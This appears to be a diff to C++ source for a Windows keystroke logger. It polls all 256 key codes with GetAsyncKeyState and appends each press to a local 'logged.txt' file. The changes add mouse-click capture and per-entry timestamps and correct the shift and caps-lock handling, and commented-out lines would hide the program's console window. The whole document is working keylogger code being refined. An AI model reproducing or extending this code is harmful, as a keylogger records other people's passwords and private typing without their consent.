@@ -4,6 +4,7 @@
 #include <winuser.h>
 #include <time.h>
 #include <algorithm>
+#include <time.h>
 using namespace std;
 
 #define LOG_FILE "logged.txt"
@@ -24,7 +25,7 @@ string outputSpecialKey(char key) {
         result = "[SHIFT]";
         break;
     case VK_BACK:
-        result = "\b";
+        result = "[BACKSPACE]";
         break;
     case VK_TAB:
         result = "\t";
@@ -44,6 +45,12 @@ string outputSpecialKey(char key) {
     case VK_ESCAPE:
         result = "[ESCAPE]";
         break;
+    case VK_LBUTTON:
+        result = "[LEFT_CLICK]";
+        break;
+    case VK_RBUTTON:
+        result = "[RIGHT_CLICK]";
+        break;
     default:
         break;
     }
@@ -54,34 +61,49 @@ string outputSpecialKey(char key) {
 int main()
 {
     int specialKeys[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB,
-        VK_CONTROL, VK_MENU, VK_CAPITAL, VK_DELETE, VK_ESCAPE};
+        VK_CONTROL, VK_MENU, VK_CAPITAL, VK_DELETE, VK_ESCAPE, VK_LBUTTON,
+        VK_RBUTTON};
 
     // HWND hwnd = GetConsoleWindow();
     // ShowWindow(hwnd, SW_HIDE);
 
     while (true) {
-        for (int i = 0; i < 256; i++) {
-            if (GetAsyncKeyState((char)i) & 0xF) {
+        time_t current = time(0);
+
+        for (int key = 0; key < 256; key++) {
+            // check if key was pressed after previous call to GetAsyncKeyState
+            if (GetAsyncKeyState((char)key) & 0x0001) {
                 string output;
 
-                if (count(begin(specialKeys), end(specialKeys), i) > 0) {
-                    output = outputSpecialKey((char)i);
+                // check if special key was detected
+                if (count(begin(specialKeys), end(specialKeys), key) > 0) {
+                    output = outputSpecialKey((char)key);
+                // else, normal key was pressed
                 } else {
                     bool isUpper = false;
-                    if (GetKeyState(VK_SHIFT) & 0x1) {
+                    // check if shift key is currently pressed
+                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                         isUpper = !isUpper;
                     }
-                    if (GetKeyState(VK_CAPITAL) & 0x1) {
+                    // check if caps lock key is currently toggled
+                    if (GetKeyState(VK_CAPITAL) & 0x0001) {
                         isUpper = !isUpper;
                     }
                     
+                    // toggle the case of the output
                     if (isUpper) {
-                        output = (char)i;
+                        output = (char)key;
                     } else {
-                        output = tolower((char)i);
+                        output = tolower((char)key);
                     }
                 }
-                outputLog << output;;
+                // get current time
+                char * date = ctime(&current);
+                date[strlen(date) - 1] = '\0';
+                // output to text file
+                outputLog << date;
+                outputLog << ": " << output;;
+                // new line
                 outputLog.put('\n');
             }
         }
